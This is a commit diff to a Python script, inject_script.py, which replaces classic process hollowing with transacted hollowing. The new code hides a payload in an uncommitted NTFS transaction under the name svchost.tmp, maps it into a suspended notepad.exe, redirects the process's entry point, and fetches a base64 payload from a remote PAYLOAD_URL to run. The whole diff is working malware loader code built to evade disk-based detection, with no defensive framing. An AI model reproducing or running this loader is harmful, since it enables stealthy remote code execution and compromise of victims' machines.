3ce3c4a153e4d1fe9a89ff923db03ef2088985b1
Quincyzx <tactsolos123@gmail.com>
2025-12-30 03:12:55 -0500

    Update inject_script.py

--- inject_script.py
+++ inject_script.py
@@ -6,9 +6,19 @@ MEM_COMMIT=0x1000
 MEM_RESERVE=0x2000
 PAGE_EXECUTE_READWRITE=0x40
 CREATE_SUSPENDED=0x4
-IMAGE_DOS_SIGNATURE=0x5A4D
-IMAGE_NT_SIGNATURE=0x00004550
 CONTEXT_FULL=0x10007
+SEC_IMAGE=0x1000000
+SECTION_MAP_READ=0x4
+SECTION_MAP_EXECUTE=0x8
+SECTION_MAP_WRITE=0x2
+FILE_MAP_EXECUTE=0x20
+
+# NT API structures
+class OBJECT_ATTRIBUTES(ctypes.Structure):
+    _fields_=[("Length",wintypes.ULONG),("RootDirectory",wintypes.HANDLE),("ObjectName",wintypes.LPVOID),("Attributes",wintypes.ULONG),("SecurityDescriptor",wintypes.LPVOID),("SecurityQualityOfService",wintypes.LPVOID)]
+
+class UNICODE_STRING(ctypes.Structure):
+    _fields_=[("Length",ctypes.c_ushort),("MaximumLength",ctypes.c_ushort),("Buffer",wintypes.LPWSTR)]
 
 class STARTUPINFO(ctypes.Structure):
     _fields_=[("cb",wintypes.DWORD),("lpReserved",wintypes.LPSTR),("lpDesktop",wintypes.LPSTR),("lpTitle",wintypes.LPSTR),("dwX",wintypes.DWORD),("dwY",wintypes.DWORD),("dwXSize",wintypes.DWORD),("dwYSize",wintypes.DWORD),("dwXCountChars",wintypes.DWORD),("dwYCountChars",wintypes.DWORD),("dwFillAttribute",wintypes.DWORD),("dwFlags",wintypes.DWORD),("wShowWindow",wintypes.WORD),("cbReserved2",wintypes.WORD),("lpReserved2",wintypes.LPBYTE),("hStdInput",wintypes.HANDLE),("hStdOutput",wintypes.HANDLE),("hStdError",wintypes.HANDLE)]
@@ -19,91 +29,187 @@ class PROCESS_INFORMATION(ctypes.Structure):
 class CONTEXT(ctypes.Structure):
     _fields_=[("P1Home",ctypes.c_uint64),("P2Home",ctypes.c_uint64),("P3Home",ctypes.c_uint64),("P4Home",ctypes.c_uint64),("P5Home",ctypes.c_uint64),("P6Home",ctypes.c_uint64),("ContextFlags",ctypes.c_uint32),("MxCsr",ctypes.c_uint32),("SegCs",ctypes.c_uint16),("SegDs",ctypes.c_uint16),("SegEs",ctypes.c_uint16),("SegFs",ctypes.c_uint16),("SegGs",ctypes.c_uint16),("SegSs",ctypes.c_uint16),("EFlags",ctypes.c_uint32),("Dr0",ctypes.c_uint64),("Dr1",ctypes.c_uint64),("Dr2",ctypes.c_uint64),("Dr3",ctypes.c_uint64),("Dr6",ctypes.c_uint64),("Dr7",ctypes.c_uint64),("Rax",ctypes.c_uint64),("Rcx",ctypes.c_uint64),("Rdx",ctypes.c_uint64),("Rbx",ctypes.c_uint64),("Rsp",ctypes.c_uint64),("Rbp",ctypes.c_uint64),("Rsi",ctypes.c_uint64),("Rdi",ctypes.c_uint64),("R8",ctypes.c_uint64),("R9",ctypes.c_uint64),("R10",ctypes.c_uint64),("R11",ctypes.c_uint64),("R12",ctypes.c_uint64),("R13",ctypes.c_uint64),("R14",ctypes.c_uint64),("R15",ctypes.c_uint64),("Rip",ctypes.c_uint64)]
 
+class PROCESS_BASIC_INFORMATION(ctypes.Structure):
+    _fields_=[("Reserved1",wintypes.PVOID),("PebBaseAddress",wintypes.PVOID),("Reserved2",wintypes.PVOID*2),("UniqueProcessId",wintypes.ULONG_PTR),("Reserved3",wintypes.PVOID)]
+
+ProcessBasicInformation=0
+PEB_IMAGEBASE_OFFSET=0x10
+
 k=ctypes.windll.kernel32
 n=ctypes.windll.ntdll
+
+# NT API functions
+NtCreateSection=n.NtCreateSection
+NtCreateSection.argtypes=[ctypes.POINTER(wintypes.HANDLE),wintypes.ACCESS_MASK,ctypes.POINTER(OBJECT_ATTRIBUTES),ctypes.POINTER(ctypes.c_uint64),wintypes.ULONG,wintypes.ULONG,wintypes.HANDLE]
+NtCreateSection.restype=ctypes.c_ulong
+
+NtMapViewOfSection=n.NtMapViewOfSection
+NtMapViewOfSection.argtypes=[wintypes.HANDLE,wintypes.HANDLE,ctypes.POINTER(wintypes.PVOID),ctypes.c_ulonglong,ctypes.c_size_t,ctypes.POINTER(ctypes.c_uint64),ctypes.POINTER(ctypes.c_size_t),ctypes.c_uint32,ctypes.c_ulong,ctypes.c_ulong]
+NtMapViewOfSection.restype=ctypes.c_ulong
+
+NtUnmapViewOfSection=n.NtUnmapViewOfSection
+NtUnmapViewOfSection.argtypes=[wintypes.HANDLE,wintypes.PVOID]
+NtUnmapViewOfSection.restype=ctypes.c_ulong
+
+NtQueryInformationProcess=n.NtQueryInformationProcess
+NtQueryInformationProcess.argtypes=[wintypes.HANDLE,ctypes.c_int,ctypes.c_void_p,ctypes.c_ulong,ctypes.POINTER(ctypes.c_ulong)]
+NtQueryInformationProcess.restype=ctypes.c_ulong
+
+NtResumeProcess=n.NtResumeProcess
+NtResumeProcess.argtypes=[wintypes.HANDLE]
+NtResumeProcess.restype=ctypes.c_ulong
+
 CreateProcessA=k.CreateProcessA
 CreateProcessA.argtypes=[wintypes.LPCSTR,wintypes.LPSTR,wintypes.LPVOID,wintypes.LPVOID,wintypes.BOOL,wintypes.DWORD,wintypes.LPVOID,wintypes.LPCSTR,ctypes.POINTER(STARTUPINFO),ctypes.POINTER(PROCESS_INFORMATION)]
 CreateProcessA.restype=wintypes.BOOL
-OpenProcess=k.OpenProcess
-OpenProcess.argtypes=[wintypes.DWORD,wintypes.BOOL,wintypes.DWORD]
-OpenProcess.restype=wintypes.HANDLE
-VirtualAllocEx=k.VirtualAllocEx
-VirtualAllocEx.argtypes=[wintypes.HANDLE,wintypes.LPVOID,ctypes.c_size_t,wintypes.DWORD,wintypes.DWORD]
-VirtualAllocEx.restype=wintypes.LPVOID
-WriteProcessMemory=k.WriteProcessMemory
-WriteProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]
-WriteProcessMemory.restype=wintypes.BOOL
+
 ReadProcessMemory=k.ReadProcessMemory
 ReadProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]
 ReadProcessMemory.restype=wintypes.BOOL
+
+WriteProcessMemory=k.WriteProcessMemory
+WriteProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]
+WriteProcessMemory.restype=wintypes.BOOL
+
 GetThreadContext=k.GetThreadContext
 GetThreadContext.argtypes=[wintypes.HANDLE,ctypes.POINTER(CONTEXT)]
 GetThreadContext.restype=wintypes.BOOL
+
 SetThreadContext=k.SetThreadContext
 SetThreadContext.argtypes=[wintypes.HANDLE,ctypes.POINTER(CONTEXT)]
 SetThreadContext.restype=wintypes.BOOL
-ResumeThread=k.ResumeThread
-ResumeThread.argtypes=[wintypes.HANDLE]
-ResumeThread.restype=wintypes.DWORD
+
 CloseHandle=k.CloseHandle
 CloseHandle.argtypes=[wintypes.HANDLE]
 CloseHandle.restype=wintypes.BOOL
-NtUnmapViewOfSection=n.NtUnmapViewOfSection
-NtUnmapViewOfSection.argtypes=[wintypes.HANDLE,wintypes.LPVOID]
-NtUnmapViewOfSection.restype=ctypes.c_ulong
 
-def parse_pe(payload):
-    if len(payload)<64:return None
-    if struct.unpack('<H',payload[0:2])[0]!=IMAGE_DOS_SIGNATURE:return None
-    pe_offset=struct.unpack('<I',payload[60:64])[0]
-    if pe_offset>=len(payload):return None
-    if struct.unpack('<I',payload[pe_offset:pe_offset+4])[0]!=IMAGE_NT_SIGNATURE:return None
-    opt_header_offset=pe_offset+24
-    machine=struct.unpack('<H',payload[pe_offset+4:pe_offset+6])[0]
-    is_64bit=(machine==0x8664)
-    if is_64bit:
-        entry_point_rva=struct.unpack('<I',payload[opt_header_offset+16:opt_header_offset+20])[0]
-        image_base=struct.unpack('<Q',payload[opt_header_offset+24:opt_header_offset+32])[0]
-    else:
-        entry_point_rva=struct.unpack('<I',payload[opt_header_offset+16:opt_header_offset+20])[0]
-        image_base=struct.unpack('<I',payload[opt_header_offset+28:opt_header_offset+32])[0]
-    return{'entry_point':entry_point_rva,'image_base':image_base,'is_64bit':is_64bit,'pe_offset':pe_offset}
+# Transaction APIs
+NtCreateTransaction=n.NtCreateTransaction
+NtCreateTransaction.argtypes=[ctypes.POINTER(wintypes.HANDLE),wintypes.ACCESS_MASK,ctypes.POINTER(OBJECT_ATTRIBUTES),ctypes.POINTER(ctypes.c_uint64),wintypes.ULONG,wintypes.ULONG,wintypes.ULONG,ctypes.POINTER(UNICODE_STRING),wintypes.HANDLE,ctypes.POINTER(ctypes.c_uint64)]
+NtCreateTransaction.restype=ctypes.c_ulong
 
-def hollow(hProcess,hThread,payload):
-    pe_info=parse_pe(payload)
-    if not pe_info:return False
+ktm=ctypes.windll.ktmw32
+CreateFileTransactedA=ktm.CreateFileTransactedA
+CreateFileTransactedA.argtypes=[wintypes.LPCSTR,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID]
+CreateFileTransactedA.restype=wintypes.HANDLE
+
+WriteFile=k.WriteFile
+WriteFile.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.DWORD,ctypes.POINTER(wintypes.DWORD),wintypes.LPVOID]
+WriteFile.restype=wintypes.BOOL
+
+def transacted_hollow(payload):
+    # Create NTFS transaction (file won't be on disk until committed - we never commit)
+    hTransaction=wintypes.HANDLE()
+    objAttr=OBJECT_ATTRIBUTES()
+    objAttr.Length=ctypes.sizeof(OBJECT_ATTRIBUTES)
+    timeout=ctypes.c_uint64(0)
+    status=NtCreateTransaction(ctypes.byref(hTransaction),0x2000000,ctypes.byref(objAttr),None,0,0,0,None,None,ctypes.byref(timeout))
+    if status!=0:return False
+    
+    # Create transacted file (hidden until commit - we never commit, so it's never on disk)
+    transactedPath=b"C:\\Windows\\Temp\\svchost.tmp"
+    hTransactedFile=CreateFileTransactedA(transactedPath,0x40000000|0x80000000,0,None,2,0x80,hTransaction,None,None)
+    if hTransactedFile==-1:
+        CloseHandle(hTransaction)
+        return False
+    
+    # Write payload to transacted file
+    written=wintypes.DWORD()
+    WriteFile(hTransactedFile,payload,len(payload),ctypes.byref(written),None)
+    
+    # Create section from transacted file (SEC_IMAGE requires a file)
+    hSection=wintypes.HANDLE()
+    sectionAttr=OBJECT_ATTRIBUTES()
+    sectionAttr.Length=ctypes.sizeof(OBJECT_ATTRIBUTES)
+    size=ctypes.c_uint64(len(payload))
+    status=NtCreateSection(ctypes.byref(hSection),0xF0000000,ctypes.byref(sectionAttr),ctypes.byref(size),PAGE_EXECUTE_READWRITE,SEC_IMAGE,hTransactedFile)
+    CloseHandle(hTransactedFile)
+    if status!=0:
+        CloseHandle(hTransaction)
+        return False
+    
+    # Map section into current process
+    localBase=wintypes.PVOID()
+    viewSize=ctypes.c_size_t(0)
+    status=NtMapViewOfSection(hSection,ctypes.windll.kernel32.GetCurrentProcess(),ctypes.byref(localBase),0,0,None,ctypes.byref(viewSize),2,0,PAGE_EXECUTE_READWRITE)
+    if status!=0:
+        CloseHandle(hSection)
+        return False
+    
+    # Section is already loaded from file, no need to write
+    
+    # Create notepad in suspended state
+    si=STARTUPINFO()
+    si.cb=ctypes.sizeof(STARTUPINFO)
+    pi=PROCESS_INFORMATION()
+    if not CreateProcessA(None,b"C:\\Windows\\System32\\notepad.exe",None,None,False,CREATE_SUSPENDED,None,None,ctypes.byref(si),ctypes.byref(pi)):
+        NtUnmapViewOfSection(ctypes.windll.kernel32.GetCurrentProcess(),localBase)
+        CloseHandle(hSection)
+        return False
+    
+    # Get PEB
+    pbi=PROCESS_BASIC_INFORMATION()
+    returnLength=ctypes.c_ulong()
+    status=NtQueryInformationProcess(pi.hProcess,ProcessBasicInformation,ctypes.byref(pbi),ctypes.sizeof(pbi),ctypes.byref(returnLength))
+    if status!=0:
+        k.TerminateProcess(pi.hProcess,0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        NtUnmapViewOfSection(ctypes.windll.kernel32.GetCurrentProcess(),localBase)
+        CloseHandle(hSection)
+        return False
+    
+    # Read original image base
+    originalBase=wintypes.PVOID()
+    bytesRead=ctypes.c_size_t()
+    ReadProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(originalBase),ctypes.sizeof(wintypes.PVOID),ctypes.byref(bytesRead))
+    
+    # Unmap original image
+    NtUnmapViewOfSection(pi.hProcess,originalBase)
+    
+    # Map our section into target process
+    remoteBase=wintypes.PVOID()
+    viewSize=ctypes.c_size_t(0)
+    status=NtMapViewOfSection(hSection,pi.hProcess,ctypes.byref(remoteBase),0,0,None,ctypes.byref(viewSize),2,0,PAGE_EXECUTE_READWRITE)
+    if status!=0:
+        k.TerminateProcess(pi.hProcess,0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        NtUnmapViewOfSection(ctypes.windll.kernel32.GetCurrentProcess(),localBase)
+        CloseHandle(hSection)
+        return False
+    
+    # Update PEB image base
+    WriteProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(remoteBase),ctypes.sizeof(wintypes.PVOID),None)
+    
+    # Get entry point from PE headers
+    dosHeader=ctypes.create_string_buffer(64)
+    ReadProcessMemory(pi.hProcess,remoteBase,dosHeader,64,None)
+    peOffset=struct.unpack('<I',dosHeader[60:64])[0]
+    ntHeaders=ctypes.create_string_buffer(256)
+    ReadProcessMemory(pi.hProcess,ctypes.cast(remoteBase,ctypes.POINTER(ctypes.c_byte))+peOffset,ntHeaders,256,None)
+    entryPointRVA=struct.unpack('<I',ntHeaders[24:28])[0]
+    entryPoint=ctypes.cast(remoteBase,ctypes.POINTER(ctypes.c_byte))+entryPointRVA
+    
+    # Update thread context
     ctx=CONTEXT()
     ctx.ContextFlags=CONTEXT_FULL
-    if not GetThreadContext(hThread,ctypes.byref(ctx)):return False
-    peb_addr=ctx.Rdx if pe_info['is_64bit']else ctx.Ebx
-    peb_imagebase_offset=0x10 if pe_info['is_64bit']else 0x08
-    imagebase_buffer=(ctypes.c_byte*8)()if pe_info['is_64bit']else(ctypes.c_byte*4)()
-    bytes_read=ctypes.c_size_t(0)
-    if not ReadProcessMemory(hProcess,peb_addr+peb_imagebase_offset,imagebase_buffer,len(imagebase_buffer),ctypes.byref(bytes_read)):return False
-    old_image_base=struct.unpack('<Q',bytes(imagebase_buffer))[0]if pe_info['is_64bit']else struct.unpack('<I',bytes(imagebase_buffer))[0]
-    NtUnmapViewOfSection(hProcess,old_image_base)
-    new_image_base=VirtualAllocEx(hProcess,pe_info['image_base'],len(payload),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)
-    if not new_image_base:new_image_base=VirtualAllocEx(hProcess,None,len(payload),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)
-    if not new_image_base:return False
-    written=ctypes.c_size_t(0)
-    if not WriteProcessMemory(hProcess,new_image_base,payload,len(payload),ctypes.byref(written)):return False
-    if new_image_base!=pe_info['image_base']:
-        new_base_bytes=struct.pack('<Q',new_image_base)if pe_info['is_64bit']else struct.pack('<I',new_image_base)
-        WriteProcessMemory(hProcess,peb_addr+peb_imagebase_offset,new_base_bytes,len(new_base_bytes),None)
-    entry_point=new_image_base+pe_info['entry_point']
-    ctx.Rip=entry_point if pe_info['is_64bit']else(entry_point&0xFFFFFFFF)
-    if not SetThreadContext(hThread,ctypes.byref(ctx)):return False
+    GetThreadContext(pi.hThread,ctypes.byref(ctx))
+    ctx.Rip=ctypes.cast(entryPoint,ctypes.c_uint64).value
+    SetThreadContext(pi.hThread,ctypes.byref(ctx))
+    
+    # Resume process
+    NtResumeProcess(pi.hProcess)
+    
+    # Cleanup (don't commit transaction - file never appears on disk!)
+    NtUnmapViewOfSection(ctypes.windll.kernel32.GetCurrentProcess(),localBase)
+    CloseHandle(hSection)
+    CloseHandle(hTransaction)  # Transaction rolled back - file never written to disk
+    CloseHandle(pi.hThread)
+    CloseHandle(pi.hProcess)
     return True
 
-si=STARTUPINFO()
-si.cb=ctypes.sizeof(STARTUPINFO)
-pi=PROCESS_INFORMATION()
-if CreateProcessA(None,b"C:\\Windows\\System32\\notepad.exe",None,None,False,CREATE_SUSPENDED,None,None,ctypes.byref(si),ctypes.byref(pi)):
-    hProcess=OpenProcess(PROCESS_ALL_ACCESS,False,pi.dwProcessId)
-    if hProcess:
-        payload_b64=json.loads(urllib.request.urlopen(PAYLOAD_URL).read().decode())["payload"]
-        payload=base64.b64decode(payload_b64)
-        if hollow(hProcess,pi.hThread,payload):ResumeThread(pi.hThread)
-        CloseHandle(hProcess)
-    CloseHandle(pi.hProcess)
-    CloseHandle(pi.hThread)
+# Execute
+payload_b64=json.loads(urllib.request.urlopen(PAYLOAD_URL).read().decode())["payload"]
+payload=base64.b64decode(payload_b64)
+transacted_hollow(payload)
